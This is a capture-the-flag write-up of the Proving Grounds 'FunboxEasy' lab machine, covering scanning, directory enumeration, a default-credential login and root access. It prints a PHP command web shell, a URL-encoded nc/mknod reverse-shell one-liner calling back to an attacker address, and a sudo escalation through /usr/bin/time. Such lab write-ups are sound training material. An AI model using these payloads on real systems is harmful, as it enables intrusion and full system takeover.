---
layout: default
title: FunboxEasy
parent: Proving Grounds Play
nav_order: 14
---

# Scanning

---

```bash
                                                                                                [16/16]
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funboxeasy]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.222.111
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-08 12:10 EST
Nmap scan report for 192.168.222.111
Host is up (0.061s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION                                                                         22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b2:d8:51:6e:c5:84:05:19:08:eb:c8:58:27:13:13:2f (RSA)
|   256 b0:de:97:03:a7:2f:f4:e2:ab:4a:9c:d9:43:9b:8a:48 (ECDSA)
|_  256 9d:0f:9a:26:38:4f:01:80:a7:a6:80:9d:d1:d4:cf:ec (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 1 disallowed entry
|_gym
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|_    HY000

```

# Enumeration

---

## 80 | HTTP

### Gobuster

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/lampiao]
└─$ gobuster dir -u http://192.168.222.111 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.
3-medium.txt -t 80 -f -x php,txt,html
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.222.111
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,php,txt
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/11/08 12:37:53 Starting gobuster in directory enumeration mode
===============================================================
/icons/               (Status: 403) [Size: 280]
/profile.php/         (Status: 302) [Size: 7247] [--> http://192.168.222.111/index.php]
/header.php/          (Status: 200) [Size: 1666]
/store/               (Status: 200) [Size: 3998]
/admin/               (Status: 200) [Size: 3263]
/registration.php/    (Status: 200) [Size: 9409]
/.html/               (Status: 403) [Size: 280]
/.php/                (Status: 403) [Size: 280]
/index.php/           (Status: 200) [Size: 3468]
/logout.php/          (Status: 200) [Size: 75]
/dashboard.php/       (Status: 302) [Size: 10272] [--> http://192.168.222.111/index.php]
/secret/              (Status: 200) [Size: 108]
/leftbar.php/         (Status: 200) [Size: 1837]
/forgot-password.php/ (Status: 200) [Size: 2763]
/.php/                (Status: 403) [Size: 280]
/.html/               (Status: 403) [Size: 280]
/gym/                 (Status: 200) [Size: 4848]


```

Run Gobuster against _/store_ directory.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/lampiao]
└─$ gobuster dir -u http://192.168.222.111/store/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 80 -f -x php,txt,html
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.222.111/store/
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt,html
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/11/08 12:44:28 Starting gobuster in directory enumeration mode
===============================================================
/.php/                (Status: 403) [Size: 280]
/.html/               (Status: 403) [Size: 280]
/index.php/           (Status: 200) [Size: 3998]
/contact.php/         (Status: 200) [Size: 4155]
/books.php/           (Status: 200) [Size: 5438]
/admin.php/           (Status: 200) [Size: 3153]
/book.php/            (Status: 200) [Size: 10]
/cart.php/            (Status: 200) [Size: 2702]
/purchase.php/        (Status: 200) [Size: 2692]
/template/            (Status: 200) [Size: 1168]
/database/            (Status: 200) [Size: 1183]
/checkout.php/        (Status: 200) [Size: 2696]
/process.php/         (Status: 200) [Size: 1996]
/models/              (Status: 200) [Size: 2128]
/functions/           (Status: 200) [Size: 1409]
/verify.php/          (Status: 200) [Size: 69]
/bootstrap/           (Status: 200) [Size: 1522]
/.php/                (Status: 403) [Size: 280]
/.html/               (Status: 403) [Size: 280]
/controllers/         (Status: 200) [Size: 984]

```

Check out the _/sotre/database_ directory and locate file _www_project.sql_

![database](../../../assets/images/ctfs/proving_grounds/funboxeasy/database.png)

Locate the default credentials for _admin_ user.

![creds](../../../assets/images/ctfs/proving_grounds/funboxeasy/creds.png)

Discovered credentials... admin:d033e22ae348aeb5660fc2140aec35850c4da997
{: .warn }

Authenticate to _admin.php_ portal with discovered credentials.

![auth](../../../assets/images/ctfs/proving_grounds/funboxeasy/auth.png)

Edit a book...

![edit](../../../assets/images/ctfs/proving_grounds/funboxeasy/edit.png)

Upload a PHP command shell file using the Image file option.

![upload](../../../assets/images/ctfs/proving_grounds/funboxeasy/upload.png)

```bash
# Create file test.php with the following web shell code

<?php
echo "<pre>";
passthru($_GET['cmd']);
echo "</pre>";
?>

```

Images are placed in the _/img_ directory.
Test PHP shell RCE functionality.

![cmd](../../../assets/images/ctfs/proving_grounds/funboxeasy/cmd.png)

# Exploitation

---

## LFI

Now that we have a PHP command shell uploaded let get a revere shell.

Use _revshellgen_ and _urlencode_ to get a url encoded mk-nod reverse shell one-liner.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funboxeasy]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod | tail -n 1
rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funboxeasy]
└─$ urlencode "rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l"
rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl

```

Run the reverse shell one-liner and get a reverse shell on our netcat listener.

```bash
URL: 192.168.222.111/store/bootstrap/img/test.php?cmd=rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl
```

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funboxeasy]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.222.111] 39914
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Post-Exploitation

---

## Enumerate Users

Discover user _tony_ and the file _password.txt_ which contains an SSH password.

```bash
www-data@funbox3:/home/tony$ ls -la
total 24
drwxr-xr-x 2 tony tony 4096 Oct 30  2020 .
drwxr-xr-x 3 root root 4096 Jul 30  2020 ..
-rw------- 1 tony tony    0 Oct 30  2020 .bash_history
-rw-r--r-- 1 tony tony  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 tony tony 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 tony tony  807 Feb 25  2020 .profile
-rw-rw-r-- 1 tony tony   70 Jul 31  2020 password.txt
www-data@funbox3:/home/tony$ cat password.txt
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
```

## Pivot to User Tony

```bash
www-data@funbox3:/home/tony$ ssh tony@127.0.0.1
Could not create directory '/var/www/.ssh'.
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:lDqW7tOK4ZCIRla+OSX6KVPDsRFL04w865Q2Q7MR7+k.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
tony@127.0.0.1's password:

tony@funbox3:~$ id
uid=1000(tony) gid=1000(tony) groups=1000(tony),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)

```

## Check Sudo Permissions for Tony

```bash
tony@funbox3:~$ sudo -l
Matching Defaults entries for tony on funbox3:
    env_reset, mail_badpass,/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD:
        /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh

```

## Check GTFOBins for Sudo

Review the above _/usr/bin_ binaries to see which can be exploited with Sudo to get a root shell.

![gtfobins](../../../assets/images/ctfs/proving_grounds/funboxeasy/gtfobins.png)

```bash
tony@funbox3:~$ sudo /usr/bin/time /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)

```
